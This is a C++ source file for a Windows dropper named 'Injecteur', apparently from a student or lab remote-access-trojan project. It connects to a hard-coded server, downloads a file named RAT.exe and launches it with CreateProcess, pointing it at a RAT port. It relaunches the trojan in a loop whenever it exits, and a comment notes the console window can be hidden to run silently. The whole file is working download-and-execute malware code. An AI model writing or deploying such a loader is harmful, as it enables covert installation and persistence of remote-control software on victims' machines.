//
// Injecteur.cpp
//
//
// The program attempts to connect to a server and port
// specified on the command line. The Server program prints
// the needed information when it is started. Once connected,
// the program sends a file name to the server, waits for a response
// and receives the file, the RAT.exe.
//
// Compile and link with wsock32.lib.
// Using multi-byte encoding.
// Targeting the Windows:Subsytem, with mainCRTStartup entry point
//
// Pass the server name, port number, and file name on the command line. 
//
// Example: Client MyMachineName 2000 RAT.exe
//
#include <stdio.h>
#include <winsock.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <Windows.h>
#include "Connection.h"
#include "Connection_error.h"

using namespace std;

//Define for port and host arguments
#define HARD_CODED_ARGS
#define SERVER_NAME "127.0.0.1" //Can be Name or IP address
#define MY_PORT 2020
#define RAT_PORT 2030
#define FILE_NAME "RAT.exe"

// Function prototype
int StreamClient(char *szServer, short nPort, string paramFileName);
string getFileName(const string& s);

 

// Helper macro for displaying errors
#define PRINTERROR(s)	cout<<"\n"<<s<<":"<<WSAGetLastError()

////////////////////////////////////////////////////////////

void main(int argc, char **argv)
{
	//
	// Check for the host and port arguments
	//
#ifdef HARD_CODED_ARGS
	short nPort = MY_PORT;
	char* server = SERVER_NAME;
	string argFileName = FILE_NAME;

#else
	if (argc != 4)	{
		cout<<"\nSyntax: client ServerName PortNumber FileName";
		cout<<endl;
		return;
	}
	short nPort = atoi(argv[2]);
	char* server = argv[1];
	string argFileName = argv[3];
#endif

	//
	// Go do the stuff a stream client does
	//
    int exit_val = StreamClient(server, nPort, argFileName);
	
	//
	// Release WinSock
	//
	WSACleanup();

	if (exit_val == 1){
		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		string Args(argFileName+" "+
					string(server)+" "+
					to_string(RAT_PORT));
		vector<char> cmd_line(Args.begin(), Args.end());
		cmd_line.push_back('\0');

		//size_t len = Args.length();
		//LPWSTR temp = Args.c_str();
		//Args._Copy_s(Args, len, len);
		//temp[len] = '\0';

		//Necessite jeu de caractere multi-octet
		bool success = false;
		DWORD exitCode;
		while (!success){
			success = CreateProcess(	//<--CreateProcessA
								NULL,
								&cmd_line[0],
								NULL,
								NULL,
								FALSE,
								CREATE_NEW_CONSOLE, //Create_no_window to run silent
								NULL,
								NULL,
								&si,
								&pi);
			this_thread::sleep_for(2s);
			if (success){
				int result = 1;
				success = false;
				WaitForSingleObject(pi.hProcess, INFINITE);
				
				if(GetExitCodeProcess(pi.hProcess, &exitCode)){
					cout << endl << exitCode;
					if (exitCode == 0){
						success = true;
					}
				}				
			}
			this_thread::sleep_for(5s);
		}
	}

	return;
}

////////////////////////////////////////////////////////////

int StreamClient(char *szServer, short nPort, string paramFileName)
{
    cout<<"\nStream Client connecting to server: " << szServer << " on port: "<< nPort;
	cout<<endl;

	bool success = false;
	unsigned int Fetch_tries = 0;

	do {
		try
		{
			Connection OpenConnect(nPort, szServer);
			if (OpenConnect.recvFile(getFileName(paramFileName))) {
			  success = true;
			}
			else{
				  if (Fetch_tries++ > 10){
					  return 0;
				  }
			}
		}
		catch (Connection_error ex)
		{
			cout << endl << ex.what();
			this_thread::sleep_for(5s);
		}
	} while (!success);
	  
	return 1;
	  

}

string getFileName(const string& s) {
	char sep = '/';

#ifdef _WIN32
	sep = '\\';
#endif

	size_t i = s.rfind(sep, s.length());
	if (i != string::npos) {
		return(s.substr(i + 1, s.length() - i));
	}
	return(s);
}